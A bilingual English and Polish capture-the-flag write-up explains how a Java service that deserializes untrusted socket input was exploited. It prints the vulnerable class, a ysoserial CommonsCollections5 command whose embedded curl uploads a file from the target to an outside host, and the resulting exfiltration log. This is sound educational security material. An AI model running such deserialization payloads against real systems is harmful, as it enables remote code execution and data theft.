## Akashic Records (Pwn, 200p)

###ENG
[PL](#pl-version)

In the task we get a simple Java application to analyse.
Most of the application is dedicated to setting up a REST api, however there is an interesting class:

```java
// Debug

package com.supersecure.rest;

import com.supersecure.control.IMainControl;
import com.supersecure.control.impl.MainControl;
import com.supersecure.model.IBook;
import com.supersecure.model.impl.Book;
import org.apache.commons.collections.list.TreeList;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class BookAdd implements Runnable {
    private ServerSocket serverSocket = null;
    private IMainControl mainControl = null;
    // for evaluation purpose
    private final TreeList exceptionList = new TreeList();

    private void startSocket() {
        if (serverSocket != null) {
            try {
                if (!serverSocket.isClosed()) {
                    serverSocket.close();
                }
            } catch (IOException e) {
                exceptionList.add(e);
                e.printStackTrace();
            }
            serverSocket = null;
        }
        try {
            serverSocket = new ServerSocket(6666);
            if (mainControl == null) {
                mainControl = new MainControl();
            }
        } catch (IOException e) {
            exceptionList.add(e);
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        startSocket();
        while (true) {
            try {
                Socket socket = serverSocket.accept();
                (new Thread(() -> {
                    ObjectInputStream inputStream = null;
                    try {
                        inputStream = new ObjectInputStream(socket.getInputStream());
                        IBook book = (Book) inputStream.readObject();
                        mainControl.addBook(book);
                    } catch (IOException | ClassNotFoundException e) {
                        exceptionList.add(e);
                        e.printStackTrace();
                    }

                })).start();
            } catch (IOException e) {
                exceptionList.add(e);
                e.printStackTrace();
                startSocket();
            }
        }
    }
}

```

As can be seen this class exposes a raw socket connection and accepts serialized Java objects to deserialize.
Deserialization of payloads from untrusted sources is a very common vulnerability, since most deserializers provide an option to run code in order to set values for transient fields.
It is the case for python pickle, for java XMLDecoder and it is also for ObjectInputStream.

In this case there are a few known common libraries that contain classes which can be used to invoke a shell command during deserialization.
In our example in the pom.xml we could see:

```
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
```

Which is one of the libraries with gadget chain we need.
There is a github project with paylad generator so we used it: https://github.com/frohoff/ysoserial
Generating a payload with 

`java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 "curl ourhost.net:6666 -T /tmp/weirdFilename" > payload`

And then sending the generated payload to the endpoint provided in the task.
As a result we got:

```
Connection from [139.59.135.121] port 6666 [tcp/*] accepted (family 2, sport 56867)
PUT /weirdFilename HTTP/1.1
User-Agent: curl/7.38.0
Host: ourhost.net:6666
Accept: */*
Content-Length: 45
Expect: 100-continue

flag{i_foresee_An_Ap0k4lypse_f0r_21_09_2036}
```

###PL version

W zadaniu dostajemy prostą aplikacje Javową do analizy.
Większość aplikacji poświecona jest ustawieniu api RESTowego, jednak jest tam jedna interesująca klasa:

```java
// Debug

package com.supersecure.rest;

import com.supersecure.control.IMainControl;
import com.supersecure.control.impl.MainControl;
import com.supersecure.model.IBook;
import com.supersecure.model.impl.Book;
import org.apache.commons.collections.list.TreeList;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class BookAdd implements Runnable {
    private ServerSocket serverSocket = null;
    private IMainControl mainControl = null;
    // for evaluation purpose
    private final TreeList exceptionList = new TreeList();

    private void startSocket() {
        if (serverSocket != null) {
            try {
                if (!serverSocket.isClosed()) {
                    serverSocket.close();
                }
            } catch (IOException e) {
                exceptionList.add(e);
                e.printStackTrace();
            }
            serverSocket = null;
        }
        try {
            serverSocket = new ServerSocket(6666);
            if (mainControl == null) {
                mainControl = new MainControl();
            }
        } catch (IOException e) {
            exceptionList.add(e);
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        startSocket();
        while (true) {
            try {
                Socket socket = serverSocket.accept();
                (new Thread(() -> {
                    ObjectInputStream inputStream = null;
                    try {
                        inputStream = new ObjectInputStream(socket.getInputStream());
                        IBook book = (Book) inputStream.readObject();
                        mainControl.addBook(book);
                    } catch (IOException | ClassNotFoundException e) {
                        exceptionList.add(e);
                        e.printStackTrace();
                    }

                })).start();
            } catch (IOException e) {
                exceptionList.add(e);
                e.printStackTrace();
                startSocket();
            }
        }
    }
}

```

Jak widać klasa wystawia surowy socket który przyjmuje serializowane obiekty Javy i próbuje je deserializować.
Deserializacja danych pochodzących z niezaufanych źródeł to dość znana podatność, szczególnie że większość deserializerów umożliwia wykonanie kodu, aby ustawić wartości pól transient.
Tak jest w przypadku pythonowego pickle, javowego XMLDecoder i tak samo jest i dla ObjectInputStream.

W tym przypadku istnieje kilka popularnych bibliotek, zawierających klasy, które można wykorzystać do wywołania kodu na zdalnej maszynie podczas deserializacji.
W naszym przykładzie w pom.xml widzimy:

```
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
```

Które jest jedną z bibliotek zawierajacych interesujący nas gadget chain.
Istnieje projekt na githubie z gotowym generatorem payloadów więc użyjemy go: https://github.com/frohoff/ysoserial
Generujemy payload przez:

`java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 "curl ourhost.net:6666 -T /tmp/weirdFilename" > payload`

I wysyłamy go do endpointa podanego w zadaniu.
W efekcie dostajemy:

```
Connection from [139.59.135.121] port 6666 [tcp/*] accepted (family 2, sport 56867)
PUT /weirdFilename HTTP/1.1
User-Agent: curl/7.38.0
Host: ourhost.net:6666
Accept: */*
Content-Length: 45
Expect: 100-continue

flag{i_foresee_An_Ap0k4lypse_f0r_21_09_2036}
```